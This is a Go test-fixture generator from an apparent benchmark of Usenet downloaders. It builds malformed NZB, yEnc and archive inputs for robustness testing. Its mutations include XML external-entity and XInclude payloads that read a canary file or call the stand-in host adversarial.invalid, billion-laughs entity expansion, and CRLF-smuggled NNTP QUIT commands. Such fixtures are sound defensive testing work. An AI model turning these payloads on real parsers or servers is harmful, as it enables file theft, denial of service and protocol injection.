package adversarial

import (
	"bytes"
	"fmt"
	"hash/crc32"
	"regexp"
	"strconv"
	"strings"
)

var payload = []byte("usenet-bench adversarial control payload\n")

type namedBytes struct {
	name string
	data []byte
}

func xmlText(s string) string {
	// Preserve intentionally invalid controls and byte sequences. XML writers
	// that replace them with U+FFFD would neutralize the corresponding attacks.
	return strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", "\"", "&quot;", "'", "&apos;", "\r", "&#13;", "\n", "&#10;", "\t", "&#9;").Replace(s)
}

func yenc(name string, data []byte, part, total, begin, size int) []byte {
	var b bytes.Buffer
	if total > 1 {
		fmt.Fprintf(&b, "=ybegin part=%d total=%d line=128 size=%d name=%s\r\n=ypart begin=%d end=%d\r\n", part, total, size, name, begin, begin+len(data)-1)
	} else {
		fmt.Fprintf(&b, "=ybegin line=128 size=%d name=%s\r\n", len(data), name)
	}
	col := 0
	for _, raw := range data {
		v := raw + 42
		if col >= 126 {
			b.WriteString("\r\n")
			col = 0
		}
		if v == 0 || v == 10 || v == 13 || v == '=' {
			b.WriteByte('=')
			b.WriteByte(v + 64)
			col += 2
		} else {
			b.WriteByte(v)
			col++
		}
	}
	b.WriteString("\r\n")
	if total > 1 {
		fmt.Fprintf(&b, "=yend size=%d part=%d pcrc32=%08x\r\n", len(data), part, crc32.ChecksumIEEE(data))
	} else {
		fmt.Fprintf(&b, "=yend size=%d crc32=%08x\r\n", len(data), crc32.ChecksumIEEE(data))
	}
	return b.Bytes()
}

func nzb(names []string, sizes []int, ids [][]string) []byte {
	var b strings.Builder
	b.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?><nzb xmlns=\"http://www.newzbin.com/DTD/2003/nzb\"><head><meta type=\"title\">adversarial</meta></head>")
	for i, name := range names {
		fmt.Fprintf(&b, "<file poster=\"fixture@adversarial.invalid\" date=\"0\" subject=\"%s\"><groups><group>alt.binaries.test</group></groups><segments>", xmlText("\""+name+"\" yEnc"))
		for j, id := range ids[i] {
			fmt.Fprintf(&b, "<segment bytes=\"%d\" number=\"%d\">%s</segment>", sizes[i], j+1, xmlText(id))
		}
		b.WriteString("</segments></file>")
	}
	b.WriteString("</nzb>")
	return []byte(b.String())
}

func (b *Bundle) post(files ...namedBytes) {
	var names []string
	var sizes []int
	var ids [][]string
	for i, f := range files {
		id := fmt.Sprintf("%s-%03d@adversarial.invalid", b.Manifest.Case.ID, i)
		body := fmt.Sprintf("article-%03d.body", i)
		b.Data[fmt.Sprintf("payload-%03d.bin", i)] = f.data
		b.Data[body] = yenc(f.name, f.data, 1, 1, 1, len(f.data))
		b.Manifest.Articles = append(b.Manifest.Articles, Article{id, body})
		names = append(names, f.name)
		sizes = append(sizes, len(b.Data[body]))
		ids = append(ids, []string{id})
	}
	b.Data["input.nzb"] = nzb(names, sizes, ids)
}

func build(b *Bundle) error {
	c := b.Manifest.Case
	// Mutations outside the NZB layer must leave that envelope consistent.
	defer func() {
		if c.Recipe != "nzb" {
			refreshArticleEnvelope(b)
		}
	}()
	switch c.Recipe {
	case "repair-multi":
		multiRepair(b, c.Variant)
	case "yenc-boundary":
		size, err := strconv.Atoi(c.Variant)
		if err != nil || size < 1 || size > 1<<20 {
			return fmt.Errorf("invalid boundary size")
		}
		data := make([]byte, size)
		for i := range data {
			data[i] = byte(i)
		}
		b.post(namedBytes{"payload.bin", data})
		b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(data)}
	case "control":
		if c.Variant == "multipart" {
			assembly(b, "ordered")
			b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(payload)}
			return nil
		}
		name, data := "payload.bin", payload
		switch c.Variant {
		case "yenc":
		case "zip":
			name, data = "fixture.zip", zipArchive([]namedBytes{{"payload.bin", payload}})
		case "tar":
			name, data = "fixture.tar", tarArchive([]namedBytes{{"payload.bin", payload}})
		case "gzip":
			name, data = "payload.bin.gz", gzipBytes(payload)
		case "deflate":
			name, data = "payload.bin.deflate", deflateBytes(payload)
		case "rar4":
			name, data = "fixture.rar", rar4("payload.bin", payload, "")
		case "rar5":
			name, data = "fixture.rar", rar5("payload.bin", payload, "")
		case "7z":
			name, data = "fixture.7z", sevenZip("payload.bin", payload, "")
		case "par2":
			b.post(namedBytes{"payload.bin", payload}, namedBytes{"fixture.par2", par2("payload.bin", payload, "")})
			b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(payload)}
			return nil
		case "uuencode":
			b.post(namedBytes{name, data})
			b.Data["article-000.body"] = uuencode(name, data)
			b.Manifest.ExpectedOutputs = map[string]string{name: Digest(payload)}
			return nil
		default:
			return fmt.Errorf("unknown control")
		}
		b.post(namedBytes{name, data})
		b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(payload)}
	case "nzb":
		b.post(namedBytes{"payload.bin", payload})
		b.Data["input.nzb"] = mutateNZB(b.Data["input.nzb"], c.Variant)
	case "yenc":
		b.post(namedBytes{"payload.bin", payload})
		b.Data["article-000.body"] = mutateYenc(b.Data["article-000.body"], c.Variant)
		if c.Variant == "all-bytes" {
			data := make([]byte, 4096)
			for i := range data {
				data[i] = byte(i)
			}
			b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(data)}
		}
		if c.Variant == "escape-heavy" {
			b.Manifest.ExpectedOutputs = map[string]string{"payload.bin": Digest(bytes.Repeat([]byte{214, 224, 227, 19}, 4096))}
		}
		if bytes.Contains(b.Data["article-000.body"], []byte("=ypart")) || c.Variant == "missing-part" {
			id := c.ID + "-001@adversarial.invalid"
			b.Data["article-001.body"] = yenc("payload.bin", payload, 2, 2, len(payload)+1, len(payload)*2)
			b.Manifest.Articles = append(b.Manifest.Articles, Article{id, "article-001.body"})
			b.Data["input.nzb"] = nzb([]string{"payload.bin"}, []int{0}, [][]string{{b.Manifest.Articles[0].ID, id}})
		}
	case "assembly":
		assembly(b, c.Variant)
	case "path":
		name := pathValue(c.Variant)
		switch c.Family {
		case "zip-path":
			b.post(namedBytes{"fixture.zip", zipArchive([]namedBytes{{name, payload}})})
		case "tar-path":
			b.post(namedBytes{"fixture.tar", tarArchive([]namedBytes{{name, payload}})})
		case "rar4-path":
			b.post(namedBytes{"fixture.rar", rar4(name, payload, "")})
		case "rar5-path":
			b.post(namedBytes{"fixture.rar", rar5(name, payload, "")})
		case "7z-path":
			b.post(namedBytes{"fixture.7z", sevenZip(name, payload, "")})
		case "par2-path":
			b.post(namedBytes{"fixture.par2", par2(name, payload, "recovery-only")})
		case "yenc-path":
			b.post(namedBytes{"payload.bin", payload})
			b.Data["article-000.body"] = yenc(name, payload, 1, 1, 1, len(payload))
		case "nzb-path":
			b.post(namedBytes{name, payload})
			b.Data["article-000.body"] = yenc("payload.bin", payload, 1, 1, 1, len(payload))
		default:
			return fmt.Errorf("unknown path family")
		}
	case "nntp":
		b.post(namedBytes{"payload.bin", payload})
		b.Manifest.Fault = Fault{Kind: c.Variant}
		if strings.HasSuffix(c.Variant, "-byte-chunks") {
			n, _ := strconv.Atoi(strings.Split(c.Variant, "-")[0])
			b.Manifest.Fault = Fault{ChunkBytes: n}
		}
		if c.Variant == "one-byte-chunks" {
			b.Manifest.Fault = Fault{ChunkBytes: 1}
		}
		if c.Variant == "slow-body" {
			b.Manifest.Fault = Fault{Kind: "slow-body", ChunkBytes: 1, DelayMilliseconds: 1000}
		}
	case "zip":
		b.post(namedBytes{"fixture.zip", mutateZip(c.Variant)})
	case "tar":
		b.post(namedBytes{"fixture.tar", mutateTar(c.Variant)})
	case "rar4":
		b.post(namedBytes{"fixture.rar", rar4("payload.bin", payload, c.Variant)})
	case "rar5":
		b.post(namedBytes{"fixture.rar", rar5("payload.bin", payload, c.Variant)})
	case "7z":
		b.post(namedBytes{"fixture.7z", sevenZip("payload.bin", payload, c.Variant)})
	case "par2":
		b.post(namedBytes{"payload.bin", payload}, namedBytes{"fixture.par2", par2("payload.bin", payload, c.Variant)})
	case "repair":
		repair(b, c.Variant)
	case "gzip", "deflate":
		name, data := mutateCompressed(c.Recipe, c.Variant)
		b.post(namedBytes{name, data})
	case "uu":
		b.post(namedBytes{"payload.bin", payload})
		b.Data["article-000.body"] = mutateUU(c.Variant)
	case "sfv":
		b.post(namedBytes{"payload.bin", payload}, namedBytes{"fixture.sfv", sfv(c.Variant)})
	case "chain":
		chain(b, c.Variant)
	default:
		return fmt.Errorf("unimplemented recipe %q", c.Recipe)
	}
	return nil
}

func replace(data []byte, old, new string) []byte {
	if !bytes.Contains(data, []byte(old)) {
		panic("mutation anchor absent: " + old)
	}
	return bytes.Replace(data, []byte(old), []byte(new), 1)
}

func mutateNZB(data []byte, v string) []byte {
	s := string(data)
	segStart := strings.Index(s, "<segment bytes=")
	segEnd := strings.Index(s, "</segment>") + len("</segment>")
	seg := s[segStart:segEnd]
	fileStart := strings.Index(s, "<file ")
	fileEnd := strings.Index(s, "</file>") + len("</file>")
	file := s[fileStart:fileEnd]
	switch v {
	case "empty":
		return nil
	case "truncated":
		return data[:len(data)/2]
	case "mismatched":
		return replace(data, "</segments>", "</wrong>")
	case "trailing-data":
		return append(data, []byte("<nzb/>junk")...)
	case "invalid-utf8":
		return replace(data, "adversarial</meta>", "\xff\xfe</meta>")
	case "nul":
		return replace(data, "adversarial</meta>", "\x00</meta>")
	case "duplicate-attribute":
		return replace(data, "date=\"0\"", "date=\"0\" date=\"1\"")
	case "negative-bytes", "zero-bytes", "huge-bytes":
		val := map[string]string{"negative-bytes": "-1", "zero-bytes": "0", "huge-bytes": "18446744073709551615"}[v]
		a := strings.Index(seg, "bytes=\"") + 7
		z := strings.Index(seg[a:], "\"") + a
		return replace(data, seg, seg[:a]+val+seg[z:])
	case "overflow-segment":
		return replace(data, "number=\"1\"", "number=\"184467440737095516160\"")
	case "negative-number":
		return replace(data, "number=\"1\"", "number=\"-1\"")
	case "max-number":
		return replace(data, "number=\"1\"", "number=\"4294967295\"")
	case "duplicate-number":
		return replace(data, seg, seg+strings.Replace(seg, "@adversarial.invalid", "-different@adversarial.invalid", 1))
	case "duplicate-message-id":
		return replace(data, seg, seg+strings.Replace(seg, "number=\"1\"", "number=\"2\"", 1))
	case "sparse-number":
		return replace(data, "number=\"1\"", "number=\"1000000000\"")
	case "reverse-order":
		return replace(data, seg, strings.Replace(seg, "number=\"1\"", "number=\"2\"", 1)+seg)
	case "missing-subject":
		a := strings.Index(s, " subject=")
		z := strings.Index(s[a+10:], "\"") + a + 10
		return []byte(s[:a] + s[z+1:])
	case "invalid-date":
		return replace(data, "date=\"0\"", "date=\"-18446744073709551616\"")
	case "no-segments":
		return replace(data, seg, "")
	case "empty-message-id":
		a := strings.Index(seg, ">") + 1
		z := strings.Index(seg, "</segment>")
		return replace(data, seg, seg[:a]+seg[z:])
	case "crlf-message-id":
		return replace(data, "@adversarial.invalid</segment>", "@adversarial.invalid&#13;&#10;QUIT&#13;&#10;</segment>")
	case "crlf-group":
		return replace(data, "alt.binaries.test", "alt.binaries.test&#13;&#10;QUIT&#13;&#10;")
	case "duplicate-password":
		return replace(data, "</head>", "<meta type=\"password\">one</meta><meta type=\"password\">two</meta></head>")
	case "foreign-namespace":
		return replace(data, "http://www.newzbin.com/DTD/2003/nzb", "urn:adversarial:foreign")
	case "nested-file":
		return replace(data, file, file[:len(file)-7]+file+"</file>")
	case "cdata":
		return replace(data, "adversarial</meta>", "<![CDATA[<file>]]></meta>")
	case "huge-subject":
		return replace(data, "yEnc\"", strings.Repeat("A", 1<<20)+"\"")
	case "many-files":
		return replace(data, file, strings.Repeat(file, 4097))
	case "many-segments":
		return replace(data, seg, strings.Repeat(seg, 8193))
	case "unique-files":
		var expanded strings.Builder
		for i := 0; i < 4097; i++ {
			name := fmt.Sprintf("unique-%05d.bin", i)
			id := fmt.Sprintf("unique-%05d@adversarial.invalid", i)
			part := nzb([]string{name}, []int{1}, [][]string{{id}})
			start := bytes.Index(part, []byte("<file "))
			end := bytes.Index(part, []byte("</file>")) + 7
			expanded.Write(part[start:end])
		}
		return replace(data, file, expanded.String())
	case "unique-segments":
		var expanded strings.Builder
		for i := 1; i <= 8193; i++ {
			fmt.Fprintf(&expanded, `<segment bytes="1" number="%d">unique-%05d@adversarial.invalid</segment>`, i, i)
		}
		return replace(data, seg, expanded.String())
	case "deep-elements":
		return replace(data, "</head>", strings.Repeat("<x>", 4097)+strings.Repeat("</x>", 4097)+"</head>")
	case "entity-recursion", "entity-expansion", "external-file-entity", "external-http-entity", "parameter-entity":
		dtd := map[string]string{
			"entity-recursion":     "<!ENTITY attack '&attack;'>",
			"external-file-entity": "<!ENTITY attack SYSTEM 'file:///adversarial-canary/secret.txt'>",
			"external-http-entity": "<!ENTITY attack SYSTEM 'http://adversarial.invalid/entity'>",
			"parameter-entity":     "<!ENTITY % remote SYSTEM 'http://adversarial.invalid/parameter'>%remote;<!ENTITY attack 'canary'>",
		}[v]
		if v == "entity-expansion" {
			dtd = "<!ENTITY e0 'canary'>"
			for i := 1; i <= 9; i++ {
				dtd += fmt.Sprintf("<!ENTITY e%d '%s'>", i, strings.Repeat(fmt.Sprintf("&e%d;", i-1), 10))
			}
			dtd += "<!ENTITY attack '&e9;'>"
		}
		data = replace(data, "?><nzb", "?><!DOCTYPE nzb ["+dtd+"]><nzb")
		return replace(data, "adversarial</meta>", "&attack;</meta>")
	case "xinclude":
		return replace(data, "</head>", "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///adversarial-canary/secret.txt\" parse=\"text\"/></head>")
	case "stylesheet":
		return replace(data, "?><nzb", "?><?xml-stylesheet type=\"text/xsl\" href=\"http://adversarial.invalid/style\"?><nzb")
	case "bidi", "html", "shell", "terminal":
		return replace(data, "adversarial</meta>", xmlText(pathValue(v))+"</meta>")
	}
	panic("unknown NZB mutation " + v)
}

func mutateYenc(data []byte, v string) []byte {
	firstEnd := bytes.Index(data, []byte("\r\n")) + 2
	end := bytes.LastIndex(data, []byte("=yend"))
	size := strconv.Itoa(len(payload))
	switch v {
	case "missing-begin":
		return data[firstEnd:]
	case "missing-end":
		return data[:end]
	case "dangling-escape":
		return append(append([]byte{}, data[:firstEnd]...), []byte("ABC=")...)
	case "truncated-body":
		return data[:firstEnd+3]
	case "missing-size":
		return replace(data, "size="+size+" ", "")
	case "negative-size", "overflow-size", "huge-size", "zero-size", "small-size", "large-size":
		val := map[string]string{"negative-size": "-1", "overflow-size": "184467440737095516160", "huge-size": "18446744073709551615", "zero-size": "0", "small-size": "1", "large-size": "999999999"}[v]
		return replace(data, "size="+size, "size="+val)
	case "duplicate-size":
		return replace(data, "size="+size, "size="+size+" size=1")
	case "duplicate-begin":
		return append(append([]byte{}, data[:firstEnd]...), data...)
	case "duplicate-end":
		return append(data, data[end:]...)
	case "zero-line":
		return replace(data, "line=128", "line=0")
	case "huge-line":
		return replace(data, "line=128", "line=18446744073709551615")
	case "unknown-field":
		return replace(data, "line=128", "unrecognized=1 line=128")
	case "small-end-size":
		return replace(data, "=yend size="+size, "=yend size=1")
	case "large-end-size":
		return replace(data, "=yend size="+size, "=yend size=999999999")
	case "bad-crc":
		return replace(data, fmt.Sprintf("crc32=%08x", crc32.ChecksumIEEE(payload)), "crc32=00000000")
	case "missing-crc":
		return replace(data, fmt.Sprintf(" crc32=%08x", crc32.ChecksumIEEE(payload)), "")
	case "nonhex-crc":
		return replace(data, fmt.Sprintf("crc32=%08x", crc32.ChecksumIEEE(payload)), "crc32=zzzzzzzz")
	case "conflicting-crcs":
		return replace(data, " crc32=", " pcrc32=00000000 crc32=")
	case "bad-part-crc", "part-zero", "part-overflow", "total-zero", "total-less-than-part", "begin-zero", "end-before-begin", "offset-overflow", "range-too-large", "range-too-small", "missing-part":
		d := yenc("payload.bin", payload, 1, 2, 1, len(payload)*2)
		switch v {
		case "bad-part-crc":
			return replace(d, fmt.Sprintf("pcrc32=%08x", crc32.ChecksumIEEE(payload)), "pcrc32=00000000")
		case "part-zero":
			return replace(d, "part=1", "part=0")
		case "part-overflow":
			return replace(d, "part=1", "part=18446744073709551616")
		case "total-zero":
			return replace(d, "total=2", "total=0")
		case "total-less-than-part":
			return replace(d, "part=1 total=2", "part=3 total=2")
		case "begin-zero":
			return replace(d, "begin=1", "begin=0")
		case "end-before-begin":
			return replace(d, "begin=1 end="+size, "begin=9 end=1")
		case "offset-overflow":
			return replace(d, "begin=1 end="+size, "begin=18446744073709551615 end=18446744073709551616")
		case "range-too-large":
			return replace(d, "end="+size, "end=999999999")
		case "range-too-small":
			return replace(d, "end="+size, "end=1")
		case "missing-part":
			a := bytes.Index(d, []byte("=ypart"))
			z := bytes.Index(d[a:], []byte("\r\n")) + a + 2
			return append(d[:a:a], d[z:]...)
		}
	case "extra-body":
		return replace(data, "=yend", "AAAA\r\n=yend")
	case "fake-trailer":
		return replace(data, "=yend", "=yend size=0 crc32=00000000\r\nAAAA\r\n=yend")
	case "preamble":
		return append([]byte("begin 644 decoy\r\nMIME-Version: 1.0\r\n\r\n"), data...)
	case "trailing-data":
		return append(data, []byte("UNEXPECTED-TAIL\r\n")...)
	case "two-blocks":
		return append(data, yenc("other.bin", []byte("different"), 1, 1, 1, 9)...)
	case "lf-only":
		return bytes.ReplaceAll(data, []byte("\r\n"), []byte("\n"))
	case "cr-only":
		return bytes.ReplaceAll(data, []byte("\r\n"), []byte("\r"))
	case "all-bytes":
		d := make([]byte, 256*16)
		for i := range d {
			d[i] = byte(i)
		}
		return yenc("payload.bin", d, 1, 1, 1, len(d))
	case "escape-heavy":
		return yenc("payload.bin", bytes.Repeat([]byte{214, 224, 227, 19}, 4096), 1, 1, 1, 16384)
	}
	panic("unknown yEnc mutation " + v)
}

func assembly(b *Bundle, v string) {
	parts := []namedBytes{{"payload.bin", payload[:13]}, {"payload.bin", payload[13:26]}, {"payload.bin", payload[26:]}}
	var ids []string
	for i, p := range parts {
		id := fmt.Sprintf("%s-%d@adversarial.invalid", b.Manifest.Case.ID, i)
		body := fmt.Sprintf("article-%03d.body", i)
		begin := i*13 + 1
		part := i + 1
		totalSize := len(payload)
		if i == 1 {
			switch v {
			case "overlap":
				begin = 1
			case "gap":
				begin += 1
			case "wrong-name":
				p.name = "foreign.bin"
			case "wrong-total":
				totalSize *= 2
			case "wrong-part":
				part = 1
			}
		}
		b.Data[body] = yenc(p.name, p.data, part, 3, begin, totalSize)
		if !(v == "missing-first" && i == 0 || v == "missing-middle" && i == 1 || v == "missing-last" && i == 2) {
			b.Manifest.Articles = append(b.Manifest.Articles, Article{id, body})
		}
		ids = append(ids, id)
	}
	if v == "duplicate" {
		ids = append(ids, ids[0])
	}
	if v == "conflicting-duplicate" {
		body := "article-003.body"
		id := b.Manifest.Case.ID + "-3@adversarial.invalid"
		b.Data[body] = yenc("payload.bin", bytes.Repeat([]byte("X"), 13), 1, 3, 1, len(payload))
		b.Manifest.Articles = append(b.Manifest.Articles, Article{id, body})
		ids = append(ids, id)
	}
	b.Data["input.nzb"] = nzb([]string{"payload.bin"}, []int{256}, [][]string{ids})
	if v == "reverse" {
		segments := segmentElement.FindAll(b.Data["input.nzb"], -1)
		i := len(segments)
		b.Data["input.nzb"] = segmentElement.ReplaceAllFunc(b.Data["input.nzb"], func([]byte) []byte { i--; return segments[i] })
	}
	if v == "cross-file-id" {
		b.Data["input.nzb"] = nzb([]string{"payload.bin", "foreign.bin"}, []int{256, 256}, [][]string{ids, ids})
	}
}

var segmentElement = regexp.MustCompile(`<segment bytes="[^"]*" number="[^"]*">[^<]*</segment>`)
var segmentParts = regexp.MustCompile(`^(<segment bytes=")[^"]*(" number="[^"]*">)([^<]*)(</segment>)$`)

func refreshArticleEnvelope(b *Bundle) {
	sizes := map[string]int{}
	for _, a := range b.Manifest.Articles {
		sizes[xmlText(a.ID)] = len(b.Data[a.Body])
	}
	b.Data["input.nzb"] = segmentElement.ReplaceAllFunc(b.Data["input.nzb"], func(data []byte) []byte {
		p := segmentParts.FindSubmatch(data)
		n, ok := sizes[string(p[3])]
		if !ok {
			return data
		}
		return []byte(string(p[1]) + strconv.Itoa(n) + string(p[2]) + string(p[3]) + string(p[4]))
	})
	if b.Manifest.Case.Recipe == "uu" || (b.Manifest.Case.Recipe == "control" && b.Manifest.Case.Variant == "uuencode") {
		b.Data["input.nzb"] = bytes.ReplaceAll(b.Data["input.nzb"], []byte(" yEnc"), nil)
	}
}
